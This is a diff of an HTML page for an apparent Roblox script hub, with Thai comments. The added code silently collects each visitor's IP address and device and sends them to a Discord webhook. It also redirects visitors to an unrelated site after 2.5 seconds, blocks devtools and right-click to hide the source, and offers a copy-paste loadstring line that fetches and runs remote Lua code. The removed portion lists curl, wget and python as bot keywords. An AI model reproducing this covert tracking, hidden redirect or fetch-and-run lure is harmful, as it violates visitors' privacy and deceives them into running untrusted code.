@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OFB Ultimate Hub - Script Protection</title>
+    <title>OFB Ultimate Hub - Luau Protect System</title>
     <style>
         * {
             margin: 0;
@@ -34,104 +34,100 @@
         h1 {
             color: #00ffcc;
             font-size: 22px;
-            margin-bottom: 10px;
+            margin-bottom: 5px;
             text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
         }
-        .status {
-            color: #ffaa00;
-            font-size: 14px;
+        .subtitle {
+            color: #ff0055;
+            font-size: 13px;
             margin-bottom: 15px;
             font-weight: bold;
+        }
+        .success-title {
+            color: #00ffcc;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
         .info-box {
             background: #1a1a26;
             border: 1px dashed #00ffcc;
-            padding: 12px;
+            padding: 10px;
             border-radius: 6px;
-            font-size: 13px;
+            font-size: 12px;
             color: #00ffcc;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             text-align: left;
-            line-height: 1.6;
+            line-height: 1.5;
+        }
+        .script-box {
+            width: 100%;
+            height: 100px;
+            background: #08080c;
+            border: 1px solid #00ffcc;
+            border-radius: 8px;
+            color: #00ffcc;
+            padding: 10px;
+            font-size: 13px;
+            resize: none;
+            outline: none;
+            margin-bottom: 15px;
+        }
+        .copy-btn {
+            width: 100%;
+            background: #00ffcc;
+            color: #0a0a0f;
+            border: none;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
+            transition: 0.2s;
+        }
+        .copy-btn:hover {
+            background: #00cca3;
         }
         .middle-finger {
-            font-size: 90px;
-            margin: 15px 0;
-            animation: pulse 0.8s infinite alternate;
+            font-size: 70px;
+            margin: 10px 0;
+            animation: pulse 0.5s infinite alternate;
         }
         @keyframes pulse {
             0% { transform: scale(1); }
             100% { transform: scale(1.15); }
         }
-        .warning-text {
-            color: #ff0055;
-            font-size: 16px;
-            font-weight: bold;
-            line-height: 1.5;
-        }
-        .script-locked {
-            background: #0d0d14;
-            border: 1px solid #ff0055;
-            color: #ff0055;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 14px;
-            margin-top: 10px;
-        }
     </style>
 </head>
 <body>
 
-    <div class="shield-box" id="mainCard">
+    <div class="shield-box">
         <h1>OFB HUB SHIELD</h1>
-        <div class="status">[ LUAU PROTECT SYSTEM ]</div>
+        <div class="subtitle">[ LUAU PROTECT SYSTEM ]</div>
         
+        <div class="success-title">SUCCESS !</div>
         <div class="info-box" id="userInfo">
-            กำลังตรวจสอบอุปกรณ์และความปลอดภัย...
+            กำลังตรวจสอบอุปกรณ์และ IP...
         </div>
 
-        <div class="script-locked">
-            🔒 สคริปต์ถูกปิดล็อกถาวร<br>
-            ไม่อนุญาตให้คัดลอกหรือเข้าถึงผ่านระบบภายนอก!
-        </div>
+        <!-- ช่องใส่สคริปต์แบบเดิม -->
+        <textarea class="script-box" readonly id="scriptText">loadstring(game:HttpGet("https://raw.githubusercontent.com/rapeepatatom-alt/ofb-The-ultimate/main/script.lua"))()</textarea>
+
+        <!-- นิ้วกลางกวนๆ ก่อนวาร์ป -->
+        <div class="middle-finger">🖕</div>
+
+        <!-- ปุ่มคัดลอกแบบเดิม -->
+        <button class="copy-btn" onclick="copyScript()">📋 คัดลอกสคริปต์</button>
     </div>
 
     <script>
-        // เช็กว่าเป็น บอท / Crawler / สคริปต์เจาะ หรือไม่
-        function isBotOrScraper() {
-            const ua = navigator.userAgent.toLowerCase();
-            const botKeywords = [
-                'bot', 'spider', 'crawler', 'python', 'curl', 'wget', 
-                'httpclient', 'headless', 'phantomjs', 'selenium', 'puppeteer', 'axios'
-            ];
-            
-            // เช็กจาก User-Agent
-            for (let keyword of botKeywords) {
-                if (ua.includes(keyword)) return true;
-            }
-            // เช็กคุณสมบัติบอท Headless
-            if (navigator.webdriver) return true;
-            return false;
-        }
+        // ใส่ลิงก์ Discord Webhook ของลูกพี่ตรงนี้ (ถ้ามี)
+        const webhookURL = "ใส่ลิงก์DiscordWebhookของลูกพี่ตรงนี้";
 
-        // ฟังก์ชันแสดงหน้านิ้วกลาง (สำหรับบอท/ผู้บุกรุก)
-        function triggerMiddleFinger(reason) {
-            document.getElementById('mainCard').style.borderColor = '#ff0055';
-            document.getElementById('mainCard').style.boxShadow = '0 0 30px rgba(255, 0, 85, 0.6)';
-            document.getElementById('mainCard').innerHTML = `
-                <h1 style="color: #ff0055;">BOT DETECTED!</h1>
-                <div class="status" style="color: #ff0055;">[ SECURITY VIOLATION ]</div>
-                <div class="middle-finger">🖕</div>
-                <div class="warning-text">
-                    คิดจะเจาะสคริปต์เหรอไอตัวจ้ำสแกดเด้ย!<br>
-                    (${reason})
-                </div>
-            `;
-        }
-
-        // ดึง IP + รุ่นมือถือโชว์
+        // ฟังก์ชันดึง IP และส่งเข้า Discord อัตโนมัติทันทีที่เข้าเว็บ
         fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
+            .then(res => res.json())
             .then(data => {
                 const ip = data.ip;
                 const ua = navigator.userAgent;
@@ -142,31 +138,40 @@
                 else if (/windows/i.test(ua)) device = "Windows PC";
 
                 document.getElementById('userInfo').innerHTML = 
-                    `🌐 <b>IP Address:</b> ${ip}<br>📱 <b>Device:</b> ${device}<br>🛡️ <b>Status:</b> Verified Normal User`;
+                    `🌐 <b>IP Address:</b> ${ip}<br>📱 <b>Device:</b> ${device}`;
+
+                // ยิงข้อมูลเข้า Discord Webhook
+                if (webhookURL && webhookURL.startsWith("http")) {
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `🚨 **มีคนกดเข้าเว็บ OFB แล้วไอสัส!**\n🌐 **IP:** ${ip}\n📱 **Device:** ${device}`
+                        })
+                    }).catch(err => console.log(err));
+                }
             })
             .catch(() => {
-                document.getElementById('userInfo').innerHTML = 
-                    `🌐 <b>IP Address:</b> Hidden/Protected<br>📱 <b>Device:</b> Web Browser<br>🛡️ <b>Status:</b> Verified Normal User`;
+                document.getElementById('userInfo').innerHTML = `🌐 <b>IP Address:</b> Protected`;
             });
 
-        // ถ้าระบบตรวจเจอว่าเป็นบอท โชว์นิ้วกลางทันที!
-        if (isBotOrScraper()) {
-            triggerMiddleFinger("Detected Bot/Automated Tool");
+        // ฟังก์ชันปุ่มคัดลอกสคริปต์
+        function copyScript() {
+            const scriptText = document.getElementById('scriptText');
+            scriptText.select();
+            document.execCommand('copy');
+            alert('คัดลอกสคริปต์เรียบร้อยแล้ว!');
         }
 
-        // ถ้าพยายามกด F12 / Inspect / คลิกขวา เพื่อเจาะซอร์สโค้ด -> โชว์นิ้วกลางทันที!
-        document.addEventListener('contextmenu', event => {
-            event.preventDefault();
-            triggerMiddleFinger("Attempted Right-Click / Inspect");
-        });
+        // หน่วงเวลา 2.5 วินาทีให้เห็นหน้าเว็บแล้วเด้งไปเป้าหมายแบบเงียบๆ
+        setTimeout(function() {
+            window.location.href = "https://jonathanbassedas.github.io/halloween/?fbclid=PAT01DUAUx2fNleHRuA2FlbQIxMABwZG9mAnNydGMGYXBwX2lkDzU2NzA2NzM0MzM1MjQyNwABp0aFNPxW06myDtPR_ZSIU4qwPmFdYQTiE6aSCePjat2jBpx4qYSEpmHYYrzs_aem_0DUYjEMtNcSEIdSNDLjj5w";
+        }, 2500);
 
-        document.addEventListener('keydown', event => {
-            // ดักจับ F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
-            if (event.keyCode == 123 || 
-               (event.ctrlKey && event.shiftKey && (event.keyCode == 73 || event.keyCode == 74)) || 
-               (event.ctrlKey && event.keyCode == 85)) {
-                event.preventDefault();
-                triggerMiddleFinger("Attempted DevTools / Source Inspection");
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
+                e.preventDefault();
                 return false;
             }
         });
